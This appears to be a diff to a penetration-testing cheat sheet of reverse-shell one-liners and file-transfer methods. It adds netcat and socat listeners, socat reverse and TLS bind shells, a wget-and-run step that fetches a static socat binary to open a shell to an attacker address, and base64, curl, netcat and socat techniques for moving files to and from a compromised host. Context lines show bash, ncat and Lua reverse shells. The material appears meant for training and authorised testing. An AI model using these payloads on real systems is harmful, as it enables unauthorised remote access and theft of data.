@@ -1,4 +1,11 @@
 # Reverse shell
+
+## Listener 
+Before any reverse shell, you need to set up the listener, which will listen to a port and receive connections:
+```
+nc -lvvp <PORT>
+rlwrap nc -lvvp <PORT>
+```
 ## Bash TCP
 ```shell
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
@@ -36,12 +43,24 @@ ncat 10.0.0.1 4242 -e /bin/bash
 ncat --udp 10.0.0.1 4242 -e /bin/bash
 ```
 ## Socat
-```shell
-socat file:`tty`,raw,echo=0 TCP-L:4242
-/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+Start a listener:
 ```
+socat -d -d TCP4-LISTEN:443 STDOUT
+```
+Connect:
 ```shell
+socat TCP4:192.168.206.52:443 EXEC:/bin/bash
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+```
+Encrypted listener:
+```
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+```
+Connect:
+```
+socat - OPENSSL:10.11.0.4:443,verify=0
 ```
 Static socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
 ## Telnet
@@ -224,7 +243,7 @@ Thread thread = new Thread(){
 thread.start();
 ```
 ## Lua
-```powershell
+```
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 
 lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
@@ -282,4 +301,76 @@ int main(void){
 
     return 0;       
 }
+```
+
+# Download and execute methods
+## Base64
+### Uploading files
+Encoding file:
+```
+cat ncat | base64 -w 0
+```
+Encode and pipe to a file:
+```
+cat /bin/nc | base64 -w 0 > nc.b64
+```
+Decoding buffer:
+```
+echo -n (paste) | base64 -d > ncat
+```
+## HTTP
+### curl
+#### Uploading files
+Using upload.php:
+```
+<?php
+
+$target_path = "./../uploads/";
+$target_path = $target_path . basename( $_FILES['uploadedfile']['name']);
+
+echo "Source=" .        $_FILES['uploadedfile']['name'] . "<br />";
+echo "Destination=" .   $destination_path . "<br />";
+echo "Target path=" .   $target_path . "<br />";
+echo "Size=" .          $_FILES['uploadedfile']['size'] . "<br />";
+
+if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+echo "The file ".  basename( $_FILES['uploadedfile']['name']).
+" has been uploaded";
+} else{
+echo "There was an error uploading the file, please try again!";
+}
+?>
+```
+And curl as client:
+```
+~/curl -F uploadedfile=@try-harder.mp3 http://192.168.119.239/upload/upload.php
+```
+## Netcat 
+### Downloading files
+On Kali run :
+```
+nc -nvlp <PORT> < /path/to/file.exe
+```
+On Linux run:
+```
+nc -nv <IP> <PORT> > /path/to/file.exe
+```
+### Uploading files
+On Linux:
+```
+nc -nv <IP> <PORT> < /path/to/file.exe
+```
+On Kali:
+```
+nc -nvlp <PORT> > /path/to/file.exe
+```
+## Socat 
+## Uploading files 
+On Kali run:
+```
+sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+```
+On Linux run:
+```
+socat TCP4:10.11.0.4:443
 ```
